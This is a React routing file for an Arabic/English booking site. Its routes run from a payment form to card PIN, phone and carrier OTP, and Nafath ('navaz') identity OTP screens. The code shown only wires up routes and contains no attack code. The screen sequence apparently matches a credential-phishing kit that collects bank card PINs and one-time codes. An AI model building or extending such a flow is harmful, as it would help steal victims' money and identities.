import { BrowserRouter, Route, Routes } from "react-router-dom";
import { useState } from "react";
import Home from "./screen/Home";
import Cart from "./screen/Cart";
import Phone from "./screen/Phone";
import PhoneOtp from "./screen/PhoneOtp";
import PaymentForm from "./screen/PaymentForm";
import Success from "./screen/Success";
import NavazOtp from "./screen/NavazOtp";
import Navaz from "./screen/Navaz";
import NotFound from "./screen/NotFound";
import NavBar from "./component/NavBar";
import Footer from "./component/Footer";
import "./index.css";
import Booking from "./screen/Booking";
import Data from "./screen/Data";
import Pin from "./screen/Pin";
import MobOtp from "./screen/MobOtp";
export const token = sessionStorage.getItem("session");
export const id = sessionStorage.getItem("id");
function App() {
  const [mode, setMode] = useState("ar");
  // const query = new URLSearchParams(window.location.search)

  const checkMode = (english = false, arabic = false) => {
    if (english && arabic) {
      return mode === "en"
        ? { lang: "en", word: english }
        : { lang: "ar", word: arabic };
    }

    return mode;
  };

  const sharedModeProps = { checkMode, setMode, mode };

  const routes = [
    { path: "/", element: <Home /> },
    { path: "/booking", element: <Booking /> },
    { path: "/cart", element: <Cart /> },
    { path: "/data", element: <Data {...sharedModeProps} /> },
    { path: "/payment", element: <PaymentForm {...sharedModeProps} /> },
    { path: "/pin", element: <Pin /> },
    { path: "/phone", element: <Phone {...sharedModeProps} /> },
    { path: "/phoneOtp", element: <PhoneOtp {...sharedModeProps} /> },
    { path: "/mobilyOtp", element: <MobOtp {...sharedModeProps} /> },
    { path: "/navaz", element: <Navaz {...sharedModeProps} /> },
    { path: "/navazOtp", element: <NavazOtp {...sharedModeProps} /> },
    { path: "/success", element: <Success {...sharedModeProps} /> },
    { path: "*", element: <NotFound {...sharedModeProps} /> },
  ];
  return (
    <>
      {
        <div className="flex flex-col items-center justify-between min-h-screen w-full bg-white">
          <BrowserRouter>
            <NavBar />
            <Routes>
              {routes.map(({ path, element }) => (
                <Route key={path} element={element} path={path} />
              ))}
            </Routes>
            <Footer />
          </BrowserRouter>
        </div>
      }
    </>
  );
}

export default App;
